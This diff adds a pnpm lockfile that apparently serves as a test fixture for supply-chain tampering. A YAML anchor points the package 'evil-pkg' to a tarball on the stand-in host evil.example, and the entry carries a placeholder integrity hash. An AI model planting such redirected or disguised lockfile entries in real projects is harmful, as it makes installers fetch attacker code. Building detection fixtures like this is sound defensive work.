@@ -1,0 +1,33 @@
+lockfileVersion: '9.0'
+
+settings:
+  autoInstallPeers: true
+  excludeLinksFromLockfile: false
+
+x-anchors:
+  r: &evil {integrity: sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==, tarball: 'https://evil.example/evil-pkg-1.0.0.tgz'}
+
+importers:
+
+  .:
+    dependencies:
+      evil-pkg:
+        specifier: ^1.0.0
+        version: 1.0.0
+      left-pad:
+        specifier: ^1.3.0
+        version: 1.3.0
+
+packages:
+
+  evil-pkg@1.0.0:
+    resolution: *evil
+
+  left-pad@1.3.0:
+    resolution: {integrity: sha512-XI5MPzVNApjAyhQzphX8BkmKsKUxD4LdyK24iZeQGinBN9yTQT3bzwGxgkH6C9Q2sVAnbnoaVxmUhbxjHc9Q==}
+
+snapshots:
+
+  evil-pkg@1.0.0: {}
+
+  left-pad@1.3.0: {}
